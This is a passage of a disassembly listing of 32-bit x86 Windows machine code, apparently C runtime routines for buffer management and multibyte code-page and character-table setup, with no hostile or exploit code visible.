  40821e:	e8 5f 00 00 00       	call   0x408282
  408223:	83 c4 0c             	add    $0xc,%esp
  408226:	85 c0                	test   %eax,%eax
  408228:	74 0a                	je     0x408234
  40822a:	83 66 0c 00          	andl   $0x0,0xc(%esi)
  40822e:	c6 46 14 00          	movb   $0x0,0x14(%esi)
  408232:	eb 09                	jmp    0x40823d
  408234:	c6 46 14 01          	movb   $0x1,0x14(%esi)
  408238:	33 c0                	xor    %eax,%eax
  40823a:	89 7e 0c             	mov    %edi,0xc(%esi)
  40823d:	5f                   	pop    %edi
  40823e:	5e                   	pop    %esi
  40823f:	5d                   	pop    %ebp
  408240:	c2 04 00             	ret    $0x4
  408243:	8b ff                	mov    %edi,%edi
  408245:	55                   	push   %ebp
  408246:	8b ec                	mov    %esp,%ebp
  408248:	56                   	push   %esi
  408249:	57                   	push   %edi
  40824a:	8b f1                	mov    %ecx,%esi
  40824c:	e8 9c ff ff ff       	call   0x4081ed
  408251:	8b 7d 08             	mov    0x8(%ebp),%edi
  408254:	56                   	push   %esi
  408255:	8d 04 3f             	lea    (%edi,%edi,1),%eax
  408258:	50                   	push   %eax
  408259:	8d 46 08             	lea    0x8(%esi),%eax
  40825c:	50                   	push   %eax
  40825d:	e8 20 00 00 00       	call   0x408282
  408262:	83 c4 0c             	add    $0xc,%esp
  408265:	85 c0                	test   %eax,%eax
  408267:	74 0a                	je     0x408273
  408269:	83 66 0c 00          	andl   $0x0,0xc(%esi)
  40826d:	c6 46 14 00          	movb   $0x0,0x14(%esi)
  408271:	eb 09                	jmp    0x40827c
  408273:	c6 46 14 01          	movb   $0x1,0x14(%esi)
  408277:	33 c0                	xor    %eax,%eax
  408279:	89 7e 0c             	mov    %edi,0xc(%esi)
  40827c:	5f                   	pop    %edi
  40827d:	5e                   	pop    %esi
  40827e:	5d                   	pop    %ebp
  40827f:	c2 04 00             	ret    $0x4
  408282:	8b ff                	mov    %edi,%edi
  408284:	55                   	push   %ebp
  408285:	8b ec                	mov    %esp,%ebp
  408287:	ff 75 0c             	push   0xc(%ebp)
  40828a:	e8 8d f7 ff ff       	call   0x407a1c
  40828f:	59                   	pop    %ecx
  408290:	8b 4d 08             	mov    0x8(%ebp),%ecx
  408293:	89 01                	mov    %eax,(%ecx)
  408295:	f7 d8                	neg    %eax
  408297:	1b c0                	sbb    %eax,%eax
  408299:	83 e0 f4             	and    $0xfffffff4,%eax
  40829c:	83 c0 0c             	add    $0xc,%eax
  40829f:	5d                   	pop    %ebp
  4082a0:	c3                   	ret
  4082a1:	8b ff                	mov    %edi,%edi
  4082a3:	56                   	push   %esi
  4082a4:	8b f1                	mov    %ecx,%esi
  4082a6:	57                   	push   %edi
  4082a7:	8b 7e 08             	mov    0x8(%esi),%edi
  4082aa:	39 7e 04             	cmp    %edi,0x4(%esi)
  4082ad:	74 04                	je     0x4082b3
  4082af:	33 c0                	xor    %eax,%eax
  4082b1:	eb 72                	jmp    0x408325
  4082b3:	83 3e 00             	cmpl   $0x0,(%esi)
  4082b6:	75 26                	jne    0x4082de
  4082b8:	6a 04                	push   $0x4
  4082ba:	6a 04                	push   $0x4
  4082bc:	e8 a9 f7 ff ff       	call   0x407a6a
  4082c1:	6a 00                	push   $0x0
  4082c3:	89 06                	mov    %eax,(%esi)
  4082c5:	e8 fd f7 ff ff       	call   0x407ac7
  4082ca:	8b 06                	mov    (%esi),%eax
  4082cc:	83 c4 0c             	add    $0xc,%esp
  4082cf:	85 c0                	test   %eax,%eax
  4082d1:	74 18                	je     0x4082eb
  4082d3:	89 46 04             	mov    %eax,0x4(%esi)
  4082d6:	83 c0 10             	add    $0x10,%eax
  4082d9:	89 46 08             	mov    %eax,0x8(%esi)
  4082dc:	eb d1                	jmp    0x4082af
  4082de:	2b 3e                	sub    (%esi),%edi
  4082e0:	c1 ff 02             	sar    $0x2,%edi
  4082e3:	81 ff ff ff ff 7f    	cmp    $0x7fffffff,%edi
  4082e9:	76 05                	jbe    0x4082f0
  4082eb:	6a 0c                	push   $0xc
  4082ed:	58                   	pop    %eax
  4082ee:	eb 35                	jmp    0x408325
  4082f0:	53                   	push   %ebx
  4082f1:	6a 04                	push   $0x4
  4082f3:	8d 1c 3f             	lea    (%edi,%edi,1),%ebx
  4082f6:	53                   	push   %ebx
  4082f7:	ff 36                	push   (%esi)
  4082f9:	e8 44 18 00 00       	call   0x409b42
  4082fe:	83 c4 0c             	add    $0xc,%esp
  408301:	85 c0                	test   %eax,%eax
  408303:	75 05                	jne    0x40830a
  408305:	6a 0c                	push   $0xc
  408307:	5e                   	pop    %esi
  408308:	eb 10                	jmp    0x40831a
  40830a:	89 06                	mov    %eax,(%esi)
  40830c:	8d 0c b8             	lea    (%eax,%edi,4),%ecx
  40830f:	8d 04 98             	lea    (%eax,%ebx,4),%eax
  408312:	89 4e 04             	mov    %ecx,0x4(%esi)
  408315:	89 46 08             	mov    %eax,0x8(%esi)
  408318:	33 f6                	xor    %esi,%esi
  40831a:	6a 00                	push   $0x0
  40831c:	e8 a6 f7 ff ff       	call   0x407ac7
  408321:	59                   	pop    %ecx
  408322:	8b c6                	mov    %esi,%eax
  408324:	5b                   	pop    %ebx
  408325:	5f                   	pop    %edi
  408326:	5e                   	pop    %esi
  408327:	c3                   	ret
  408328:	8b ff                	mov    %edi,%edi
  40832a:	55                   	push   %ebp
  40832b:	8b ec                	mov    %esp,%ebp
  40832d:	5d                   	pop    %ebp
  40832e:	e9 84 f9 ff ff       	jmp    0x407cb7
  408333:	8b ff                	mov    %edi,%edi
  408335:	55                   	push   %ebp
  408336:	8b ec                	mov    %esp,%ebp
  408338:	56                   	push   %esi
  408339:	8b 75 08             	mov    0x8(%ebp),%esi
  40833c:	85 f6                	test   %esi,%esi
  40833e:	75 0f                	jne    0x40834f
  408340:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  408343:	e8 d9 00 00 00       	call   0x408421
  408348:	33 c0                	xor    %eax,%eax
  40834a:	e9 a8 00 00 00       	jmp    0x4083f7
  40834f:	53                   	push   %ebx
  408350:	33 db                	xor    %ebx,%ebx
  408352:	66 39 1e             	cmp    %bx,(%esi)
  408355:	75 25                	jne    0x40837c
  408357:	8b 75 0c             	mov    0xc(%ebp),%esi
  40835a:	39 5e 0c             	cmp    %ebx,0xc(%esi)
  40835d:	75 11                	jne    0x408370
  40835f:	6a 01                	push   $0x1
  408361:	8b ce                	mov    %esi,%ecx
  408363:	e8 92 00 00 00       	call   0x4083fa
  408368:	85 c0                	test   %eax,%eax
  40836a:	0f 85 86 00 00 00    	jne    0x4083f6
  408370:	8b 46 08             	mov    0x8(%esi),%eax
  408373:	88 18                	mov    %bl,(%eax)
  408375:	33 c0                	xor    %eax,%eax
  408377:	89 5e 10             	mov    %ebx,0x10(%esi)
  40837a:	eb 7a                	jmp    0x4083f6
  40837c:	53                   	push   %ebx
  40837d:	53                   	push   %ebx
  40837e:	53                   	push   %ebx
  40837f:	53                   	push   %ebx
  408380:	6a ff                	push   $0xffffffff
  408382:	56                   	push   %esi
  408383:	53                   	push   %ebx
  408384:	ff 75 14             	push   0x14(%ebp)
  408387:	e8 35 0a 00 00       	call   0x408dc1
  40838c:	83 c4 20             	add    $0x20,%esp
  40838f:	85 c0                	test   %eax,%eax
  408391:	75 16                	jne    0x4083a9
  408393:	ff 15 70 f0 40 00    	call   *0x40f070
  408399:	50                   	push   %eax
  40839a:	e8 e6 f0 ff ff       	call   0x407485
  40839f:	59                   	pop    %ecx
  4083a0:	e8 16 f1 ff ff       	call   0x4074bb
  4083a5:	8b 00                	mov    (%eax),%eax
  4083a7:	eb 4d                	jmp    0x4083f6
  4083a9:	57                   	push   %edi
  4083aa:	8b 7d 0c             	mov    0xc(%ebp),%edi
  4083ad:	3b 47 0c             	cmp    0xc(%edi),%eax
  4083b0:	76 0c                	jbe    0x4083be
  4083b2:	50                   	push   %eax
  4083b3:	8b cf                	mov    %edi,%ecx
  4083b5:	e8 40 00 00 00       	call   0x4083fa
  4083ba:	85 c0                	test   %eax,%eax
  4083bc:	75 37                	jne    0x4083f5
  4083be:	53                   	push   %ebx
  4083bf:	53                   	push   %ebx
  4083c0:	ff 77 0c             	push   0xc(%edi)
  4083c3:	ff 77 08             	push   0x8(%edi)
  4083c6:	6a ff                	push   $0xffffffff
  4083c8:	56                   	push   %esi
  4083c9:	53                   	push   %ebx
  4083ca:	ff 75 14             	push   0x14(%ebp)
  4083cd:	e8 ef 09 00 00       	call   0x408dc1
  4083d2:	83 c4 20             	add    $0x20,%esp
  4083d5:	85 c0                	test   %eax,%eax
  4083d7:	75 16                	jne    0x4083ef
  4083d9:	ff 15 70 f0 40 00    	call   *0x40f070
  4083df:	50                   	push   %eax
  4083e0:	e8 a0 f0 ff ff       	call   0x407485
  4083e5:	59                   	pop    %ecx
  4083e6:	e8 d0 f0 ff ff       	call   0x4074bb
  4083eb:	8b 00                	mov    (%eax),%eax
  4083ed:	eb 06                	jmp    0x4083f5
  4083ef:	48                   	dec    %eax
  4083f0:	89 47 10             	mov    %eax,0x10(%edi)
  4083f3:	33 c0                	xor    %eax,%eax
  4083f5:	5f                   	pop    %edi
  4083f6:	5b                   	pop    %ebx
  4083f7:	5e                   	pop    %esi
  4083f8:	5d                   	pop    %ebp
  4083f9:	c3                   	ret
  4083fa:	8b ff                	mov    %edi,%edi
  4083fc:	56                   	push   %esi
  4083fd:	8b f1                	mov    %ecx,%esi
  4083ff:	80 7e 14 00          	cmpb   $0x0,0x14(%esi)
  408403:	74 04                	je     0x408409
  408405:	c6 46 14 00          	movb   $0x0,0x14(%esi)
  408409:	e8 ad f0 ff ff       	call   0x4074bb
  40840e:	6a 22                	push   $0x22
  408410:	59                   	pop    %ecx
  408411:	89 08                	mov    %ecx,(%eax)
  408413:	8b c1                	mov    %ecx,%eax
  408415:	83 66 0c 00          	andl   $0x0,0xc(%esi)
  408419:	c6 46 14 00          	movb   $0x0,0x14(%esi)
  40841d:	5e                   	pop    %esi
  40841e:	c2 04 00             	ret    $0x4
  408421:	33 c0                	xor    %eax,%eax
  408423:	38 41 14             	cmp    %al,0x14(%ecx)
  408426:	74 03                	je     0x40842b
  408428:	88 41 14             	mov    %al,0x14(%ecx)
  40842b:	89 41 08             	mov    %eax,0x8(%ecx)
  40842e:	89 41 0c             	mov    %eax,0xc(%ecx)
  408431:	89 41 10             	mov    %eax,0x10(%ecx)
  408434:	c3                   	ret
  408435:	8b ff                	mov    %edi,%edi
  408437:	55                   	push   %ebp
  408438:	8b ec                	mov    %esp,%ebp
  40843a:	81 ec 2c 02 00 00    	sub    $0x22c,%esp
  408440:	a1 04 60 41 00       	mov    0x416004,%eax
  408445:	33 c5                	xor    %ebp,%eax
  408447:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40844a:	8b 45 08             	mov    0x8(%ebp),%eax
  40844d:	8d 8d f0 fd ff ff    	lea    -0x210(%ebp),%ecx
  408453:	68 05 01 00 00       	push   $0x105
  408458:	51                   	push   %ecx
  408459:	50                   	push   %eax
  40845a:	ff 15 a8 f1 40 00    	call   *0x40f1a8
  408460:	85 c0                	test   %eax,%eax
  408462:	75 11                	jne    0x408475
  408464:	ff 15 70 f0 40 00    	call   *0x40f070
  40846a:	50                   	push   %eax
  40846b:	e8 15 f0 ff ff       	call   0x407485
  408470:	59                   	pop    %ecx
  408471:	33 c0                	xor    %eax,%eax
  408473:	eb 55                	jmp    0x4084ca
  408475:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  408478:	8b 45 10             	mov    0x10(%ebp),%eax
  40847b:	83 a5 e4 fd ff ff 00 	andl   $0x0,-0x21c(%ebp)
  408482:	89 8d d4 fd ff ff    	mov    %ecx,-0x22c(%ebp)
  408488:	89 85 d8 fd ff ff    	mov    %eax,-0x228(%ebp)
  40848e:	89 8d dc fd ff ff    	mov    %ecx,-0x224(%ebp)
  408494:	89 85 e0 fd ff ff    	mov    %eax,-0x220(%ebp)
  40849a:	c6 85 e8 fd ff ff 00 	movb   $0x0,-0x218(%ebp)
  4084a1:	e8 08 fd ff ff       	call   0x4081ae
  4084a6:	50                   	push   %eax
  4084a7:	8d 85 ef fd ff ff    	lea    -0x211(%ebp),%eax
  4084ad:	50                   	push   %eax
  4084ae:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
  4084b4:	50                   	push   %eax
  4084b5:	8d 85 f0 fd ff ff    	lea    -0x210(%ebp),%eax
  4084bb:	50                   	push   %eax
  4084bc:	e8 72 fe ff ff       	call   0x408333
  4084c1:	8b 85 e4 fd ff ff    	mov    -0x21c(%ebp),%eax
  4084c7:	83 c4 10             	add    $0x10,%esp
  4084ca:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4084cd:	33 cd                	xor    %ebp,%ecx
  4084cf:	e8 71 b2 ff ff       	call   0x403745
  4084d4:	c9                   	leave
  4084d5:	c3                   	ret
  4084d6:	6a 08                	push   $0x8
  4084d8:	68 38 4a 41 00       	push   $0x414a38
  4084dd:	e8 0e bd ff ff       	call   0x4041f0
  4084e2:	8b 45 08             	mov    0x8(%ebp),%eax
  4084e5:	ff 30                	push   (%eax)
  4084e7:	e8 d1 f4 ff ff       	call   0x4079bd
  4084ec:	59                   	pop    %ecx
  4084ed:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4084f1:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4084f4:	e8 2a 00 00 00       	call   0x408523
  4084f9:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  408500:	e8 12 00 00 00       	call   0x408517
  408505:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  408508:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40850f:	59                   	pop    %ecx
  408510:	5f                   	pop    %edi
  408511:	5e                   	pop    %esi
  408512:	5b                   	pop    %ebx
  408513:	c9                   	leave
  408514:	c2 0c 00             	ret    $0xc
  408517:	8b 45 10             	mov    0x10(%ebp),%eax
  40851a:	ff 30                	push   (%eax)
  40851c:	e8 e4 f4 ff ff       	call   0x407a05
  408521:	59                   	pop    %ecx
  408522:	c3                   	ret
  408523:	8b ff                	mov    %edi,%edi
  408525:	56                   	push   %esi
  408526:	8b f1                	mov    %ecx,%esi
  408528:	b9 01 01 00 00       	mov    $0x101,%ecx
  40852d:	51                   	push   %ecx
  40852e:	8b 06                	mov    (%esi),%eax
  408530:	8b 00                	mov    (%eax),%eax
  408532:	8b 40 48             	mov    0x48(%eax),%eax
  408535:	83 c0 18             	add    $0x18,%eax
  408538:	50                   	push   %eax
  408539:	51                   	push   %ecx
  40853a:	ff 35 94 70 41 00    	push   0x417094
  408540:	e8 f7 06 00 00       	call   0x408c3c
  408545:	8b 06                	mov    (%esi),%eax
  408547:	b9 00 01 00 00       	mov    $0x100,%ecx
  40854c:	51                   	push   %ecx
  40854d:	8b 00                	mov    (%eax),%eax
  40854f:	8b 40 48             	mov    0x48(%eax),%eax
  408552:	05 19 01 00 00       	add    $0x119,%eax
  408557:	50                   	push   %eax
  408558:	51                   	push   %ecx
  408559:	ff 35 98 70 41 00    	push   0x417098
  40855f:	e8 d8 06 00 00       	call   0x408c3c
  408564:	8b 46 04             	mov    0x4(%esi),%eax
  408567:	83 c4 20             	add    $0x20,%esp
  40856a:	83 c9 ff             	or     $0xffffffff,%ecx
  40856d:	8b 00                	mov    (%eax),%eax
  40856f:	8b 00                	mov    (%eax),%eax
  408571:	f0 0f c1 08          	lock xadd %ecx,(%eax)
  408575:	75 15                	jne    0x40858c
  408577:	8b 46 04             	mov    0x4(%esi),%eax
  40857a:	8b 00                	mov    (%eax),%eax
  40857c:	81 38 28 61 41 00    	cmpl   $0x416128,(%eax)
  408582:	74 08                	je     0x40858c
  408584:	ff 30                	push   (%eax)
  408586:	e8 3c f5 ff ff       	call   0x407ac7
  40858b:	59                   	pop    %ecx
  40858c:	8b 06                	mov    (%esi),%eax
  40858e:	8b 10                	mov    (%eax),%edx
  408590:	8b 46 04             	mov    0x4(%esi),%eax
  408593:	8b 08                	mov    (%eax),%ecx
  408595:	8b 42 48             	mov    0x48(%edx),%eax
  408598:	89 01                	mov    %eax,(%ecx)
  40859a:	8b 06                	mov    (%esi),%eax
  40859c:	8b 00                	mov    (%eax),%eax
  40859e:	8b 40 48             	mov    0x48(%eax),%eax
  4085a1:	f0 ff 00             	lock incl (%eax)
  4085a4:	5e                   	pop    %esi
  4085a5:	c3                   	ret
  4085a6:	8b ff                	mov    %edi,%edi
  4085a8:	55                   	push   %ebp
  4085a9:	8b ec                	mov    %esp,%ebp
  4085ab:	8b 45 08             	mov    0x8(%ebp),%eax
  4085ae:	2d a4 03 00 00       	sub    $0x3a4,%eax
  4085b3:	74 28                	je     0x4085dd
  4085b5:	83 e8 04             	sub    $0x4,%eax
  4085b8:	74 1c                	je     0x4085d6
  4085ba:	83 e8 0d             	sub    $0xd,%eax
  4085bd:	74 10                	je     0x4085cf
  4085bf:	83 e8 01             	sub    $0x1,%eax
  4085c2:	74 04                	je     0x4085c8
  4085c4:	33 c0                	xor    %eax,%eax
  4085c6:	5d                   	pop    %ebp
  4085c7:	c3                   	ret
  4085c8:	a1 5c 10 41 00       	mov    0x41105c,%eax
  4085cd:	5d                   	pop    %ebp
  4085ce:	c3                   	ret
  4085cf:	a1 58 10 41 00       	mov    0x411058,%eax
  4085d4:	5d                   	pop    %ebp
  4085d5:	c3                   	ret
  4085d6:	a1 54 10 41 00       	mov    0x411054,%eax
  4085db:	5d                   	pop    %ebp
  4085dc:	c3                   	ret
  4085dd:	a1 50 10 41 00       	mov    0x411050,%eax
  4085e2:	5d                   	pop    %ebp
  4085e3:	c3                   	ret
  4085e4:	8b ff                	mov    %edi,%edi
  4085e6:	55                   	push   %ebp
  4085e7:	8b ec                	mov    %esp,%ebp
  4085e9:	83 ec 10             	sub    $0x10,%esp
  4085ec:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4085ef:	6a 00                	push   $0x0
  4085f1:	e8 6a d2 ff ff       	call   0x405860
  4085f6:	83 25 a0 70 41 00 00 	andl   $0x0,0x4170a0
  4085fd:	8b 45 08             	mov    0x8(%ebp),%eax
  408600:	83 f8 fe             	cmp    $0xfffffffe,%eax
  408603:	75 12                	jne    0x408617
  408605:	c7 05 a0 70 41 00 01 	movl   $0x1,0x4170a0
  40860c:	00 00 00 
  40860f:	ff 15 d0 f1 40 00    	call   *0x40f1d0
  408615:	eb 2c                	jmp    0x408643
  408617:	83 f8 fd             	cmp    $0xfffffffd,%eax
  40861a:	75 12                	jne    0x40862e
  40861c:	c7 05 a0 70 41 00 01 	movl   $0x1,0x4170a0
  408623:	00 00 00 
  408626:	ff 15 cc f1 40 00    	call   *0x40f1cc
  40862c:	eb 15                	jmp    0x408643
  40862e:	83 f8 fc             	cmp    $0xfffffffc,%eax
  408631:	75 10                	jne    0x408643
  408633:	8b 45 f4             	mov    -0xc(%ebp),%eax
  408636:	c7 05 a0 70 41 00 01 	movl   $0x1,0x4170a0
  40863d:	00 00 00 
  408640:	8b 40 08             	mov    0x8(%eax),%eax
  408643:	80 7d fc 00          	cmpb   $0x0,-0x4(%ebp)
  408647:	74 0a                	je     0x408653
  408649:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40864c:	83 a1 50 03 00 00 fd 	andl   $0xfffffffd,0x350(%ecx)
  408653:	c9                   	leave
  408654:	c3                   	ret
  408655:	8b ff                	mov    %edi,%edi
  408657:	55                   	push   %ebp
  408658:	8b ec                	mov    %esp,%ebp
  40865a:	53                   	push   %ebx
  40865b:	8b 5d 08             	mov    0x8(%ebp),%ebx
  40865e:	56                   	push   %esi
  40865f:	57                   	push   %edi
  408660:	68 01 01 00 00       	push   $0x101
  408665:	33 ff                	xor    %edi,%edi
  408667:	8d 73 18             	lea    0x18(%ebx),%esi
  40866a:	57                   	push   %edi
  40866b:	56                   	push   %esi
  40866c:	e8 1f c4 ff ff       	call   0x404a90
  408671:	89 7b 04             	mov    %edi,0x4(%ebx)
  408674:	33 c0                	xor    %eax,%eax
  408676:	89 7b 08             	mov    %edi,0x8(%ebx)
  408679:	83 c4 0c             	add    $0xc,%esp
  40867c:	89 bb 1c 02 00 00    	mov    %edi,0x21c(%ebx)
  408682:	b9 01 01 00 00       	mov    $0x101,%ecx
  408687:	8d 7b 0c             	lea    0xc(%ebx),%edi
  40868a:	ab                   	stos   %eax,%es:(%edi)
  40868b:	ab                   	stos   %eax,%es:(%edi)
  40868c:	ab                   	stos   %eax,%es:(%edi)
  40868d:	bf 28 61 41 00       	mov    $0x416128,%edi
  408692:	2b fb                	sub    %ebx,%edi
  408694:	8a 04 37             	mov    (%edi,%esi,1),%al
  408697:	88 06                	mov    %al,(%esi)
  408699:	46                   	inc    %esi
  40869a:	83 e9 01             	sub    $0x1,%ecx
  40869d:	75 f5                	jne    0x408694
  40869f:	8d 8b 19 01 00 00    	lea    0x119(%ebx),%ecx
  4086a5:	ba 00 01 00 00       	mov    $0x100,%edx
  4086aa:	8a 04 39             	mov    (%ecx,%edi,1),%al
  4086ad:	88 01                	mov    %al,(%ecx)
  4086af:	41                   	inc    %ecx
  4086b0:	83 ea 01             	sub    $0x1,%edx
  4086b3:	75 f5                	jne    0x4086aa
  4086b5:	5f                   	pop    %edi
  4086b6:	5e                   	pop    %esi
  4086b7:	5b                   	pop    %ebx
  4086b8:	5d                   	pop    %ebp
  4086b9:	c3                   	ret
  4086ba:	8b ff                	mov    %edi,%edi
  4086bc:	55                   	push   %ebp
  4086bd:	8b ec                	mov    %esp,%ebp
  4086bf:	81 ec 18 07 00 00    	sub    $0x718,%esp
  4086c5:	a1 04 60 41 00       	mov    0x416004,%eax
  4086ca:	33 c5                	xor    %ebp,%eax
  4086cc:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4086cf:	53                   	push   %ebx
  4086d0:	56                   	push   %esi
  4086d1:	8b 75 08             	mov    0x8(%ebp),%esi
  4086d4:	57                   	push   %edi
  4086d5:	81 7e 04 e9 fd 00 00 	cmpl   $0xfde9,0x4(%esi)
  4086dc:	0f 84 0c 01 00 00    	je     0x4087ee
  4086e2:	8d 85 e8 f8 ff ff    	lea    -0x718(%ebp),%eax
  4086e8:	50                   	push   %eax
  4086e9:	ff 76 04             	push   0x4(%esi)
  4086ec:	ff 15 d4 f1 40 00    	call   *0x40f1d4
  4086f2:	85 c0                	test   %eax,%eax
  4086f4:	0f 84 f4 00 00 00    	je     0x4087ee
  4086fa:	33 db                	xor    %ebx,%ebx
  4086fc:	bf 00 01 00 00       	mov    $0x100,%edi
  408701:	8b c3                	mov    %ebx,%eax
  408703:	88 84 05 fc fe ff ff 	mov    %al,-0x104(%ebp,%eax,1)
  40870a:	40                   	inc    %eax
  40870b:	3b c7                	cmp    %edi,%eax
  40870d:	72 f4                	jb     0x408703
  40870f:	8a 85 ee f8 ff ff    	mov    -0x712(%ebp),%al
  408715:	8d 8d ee f8 ff ff    	lea    -0x712(%ebp),%ecx
  40871b:	c6 85 fc fe ff ff 20 	movb   $0x20,-0x104(%ebp)
  408722:	eb 1f                	jmp    0x408743
  408724:	0f b6 51 01          	movzbl 0x1(%ecx),%edx
  408728:	0f b6 c0             	movzbl %al,%eax
  40872b:	eb 0d                	jmp    0x40873a
  40872d:	3b c7                	cmp    %edi,%eax
  40872f:	73 0d                	jae    0x40873e
  408731:	c6 84 05 fc fe ff ff 	movb   $0x20,-0x104(%ebp,%eax,1)
  408738:	20 
  408739:	40                   	inc    %eax
  40873a:	3b c2                	cmp    %edx,%eax
  40873c:	76 ef                	jbe    0x40872d
  40873e:	83 c1 02             	add    $0x2,%ecx
  408741:	8a 01                	mov    (%ecx),%al
  408743:	84 c0                	test   %al,%al
  408745:	75 dd                	jne    0x408724
  408747:	53                   	push   %ebx
  408748:	ff 76 04             	push   0x4(%esi)
  40874b:	8d 85 fc f8 ff ff    	lea    -0x704(%ebp),%eax
  408751:	50                   	push   %eax
  408752:	57                   	push   %edi
  408753:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
  408759:	50                   	push   %eax
  40875a:	6a 01                	push   $0x1
  40875c:	53                   	push   %ebx
  40875d:	e8 23 0f 00 00       	call   0x409685
  408762:	53                   	push   %ebx
  408763:	ff 76 04             	push   0x4(%esi)
  408766:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
  40876c:	57                   	push   %edi
  40876d:	50                   	push   %eax
  40876e:	57                   	push   %edi
  40876f:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
  408775:	50                   	push   %eax
  408776:	57                   	push   %edi
  408777:	ff b6 1c 02 00 00    	push   0x21c(%esi)
  40877d:	53                   	push   %ebx
  40877e:	e8 7b 2a 00 00       	call   0x40b1fe
  408783:	83 c4 40             	add    $0x40,%esp
  408786:	8d 85 fc fc ff ff    	lea    -0x304(%ebp),%eax
  40878c:	53                   	push   %ebx
  40878d:	ff 76 04             	push   0x4(%esi)
  408790:	57                   	push   %edi
  408791:	50                   	push   %eax
  408792:	57                   	push   %edi
  408793:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
  408799:	50                   	push   %eax
  40879a:	68 00 02 00 00       	push   $0x200
  40879f:	ff b6 1c 02 00 00    	push   0x21c(%esi)
  4087a5:	53                   	push   %ebx
  4087a6:	e8 53 2a 00 00       	call   0x40b1fe
  4087ab:	83 c4 24             	add    $0x24,%esp
  4087ae:	8b c3                	mov    %ebx,%eax
  4087b0:	0f b7 8c 45 fc f8 ff 	movzwl -0x704(%ebp,%eax,2),%ecx
  4087b7:	ff 
  4087b8:	f6 c1 01             	test   $0x1,%cl
  4087bb:	74 0e                	je     0x4087cb
  4087bd:	80 4c 06 19 10       	orb    $0x10,0x19(%esi,%eax,1)
  4087c2:	8a 8c 05 fc fd ff ff 	mov    -0x204(%ebp,%eax,1),%cl
  4087c9:	eb 15                	jmp    0x4087e0
  4087cb:	f6 c1 02             	test   $0x2,%cl
  4087ce:	74 0e                	je     0x4087de
  4087d0:	80 4c 06 19 20       	orb    $0x20,0x19(%esi,%eax,1)
  4087d5:	8a 8c 05 fc fc ff ff 	mov    -0x304(%ebp,%eax,1),%cl
  4087dc:	eb 02                	jmp    0x4087e0
  4087de:	8a cb                	mov    %bl,%cl
  4087e0:	88 8c 06 19 01 00 00 	mov    %cl,0x119(%esi,%eax,1)
  4087e7:	40                   	inc    %eax
  4087e8:	3b c7                	cmp    %edi,%eax
  4087ea:	72 c4                	jb     0x4087b0
  4087ec:	eb 3d                	jmp    0x40882b
  4087ee:	33 db                	xor    %ebx,%ebx
  4087f0:	bf 00 01 00 00       	mov    $0x100,%edi
  4087f5:	8b cb                	mov    %ebx,%ecx
  4087f7:	8d 51 9f             	lea    -0x61(%ecx),%edx
  4087fa:	8d 42 20             	lea    0x20(%edx),%eax
  4087fd:	83 f8 19             	cmp    $0x19,%eax
  408800:	77 0a                	ja     0x40880c
  408802:	80 4c 0e 19 10       	orb    $0x10,0x19(%esi,%ecx,1)
  408807:	8d 41 20             	lea    0x20(%ecx),%eax
  40880a:	eb 13                	jmp    0x40881f
  40880c:	83 fa 19             	cmp    $0x19,%edx
  40880f:	77 0c                	ja     0x40881d
  408811:	8d 04 0e             	lea    (%esi,%ecx,1),%eax
  408814:	80 48 19 20          	orb    $0x20,0x19(%eax)
  408818:	8d 41 e0             	lea    -0x20(%ecx),%eax
  40881b:	eb 02                	jmp    0x40881f
  40881d:	8a c3                	mov    %bl,%al
  40881f:	88 84 0e 19 01 00 00 	mov    %al,0x119(%esi,%ecx,1)
  408826:	41                   	inc    %ecx
  408827:	3b cf                	cmp    %edi,%ecx
  408829:	72 cc                	jb     0x4087f7
  40882b:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40882e:	5f                   	pop    %edi
  40882f:	5e                   	pop    %esi
  408830:	33 cd                	xor    %ebp,%ecx
  408832:	5b                   	pop    %ebx
  408833:	e8 0d af ff ff       	call   0x403745
  408838:	c9                   	leave
  408839:	c3                   	ret
  40883a:	8b ff                	mov    %edi,%edi
  40883c:	55                   	push   %ebp
  40883d:	8b ec                	mov    %esp,%ebp
  40883f:	83 ec 14             	sub    $0x14,%esp
  408842:	ff 75 14             	push   0x14(%ebp)
  408845:	ff 75 10             	push   0x10(%ebp)
  408848:	e8 01 01 00 00       	call   0x40894e
  40884d:	ff 75 08             	push   0x8(%ebp)
  408850:	e8 8f fd ff ff       	call   0x4085e4
  408855:	8b 4d 10             	mov    0x10(%ebp),%ecx
  408858:	83 c4 0c             	add    $0xc,%esp
  40885b:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40885e:	8b 49 48             	mov    0x48(%ecx),%ecx
  408861:	3b 41 04             	cmp    0x4(%ecx),%eax
  408864:	75 04                	jne    0x40886a
  408866:	33 c0                	xor    %eax,%eax
  408868:	c9                   	leave
  408869:	c3                   	ret
  40886a:	53                   	push   %ebx
  40886b:	56                   	push   %esi
  40886c:	57                   	push   %edi
  40886d:	68 20 02 00 00       	push   $0x220
  408872:	e8 a5 f1 ff ff       	call   0x407a1c
  408877:	8b f8                	mov    %eax,%edi
  408879:	83 cb ff             	or     $0xffffffff,%ebx
  40887c:	59                   	pop    %ecx
  40887d:	85 ff                	test   %edi,%edi
  40887f:	74 2e                	je     0x4088af
  408881:	8b 75 10             	mov    0x10(%ebp),%esi
  408884:	b9 88 00 00 00       	mov    $0x88,%ecx
  408889:	8b 76 48             	mov    0x48(%esi),%esi
  40888c:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40888e:	8b f8                	mov    %eax,%edi
  408890:	57                   	push   %edi
  408891:	ff 75 f4             	push   -0xc(%ebp)
  408894:	83 27 00             	andl   $0x0,(%edi)
  408897:	e8 ad 01 00 00       	call   0x408a49
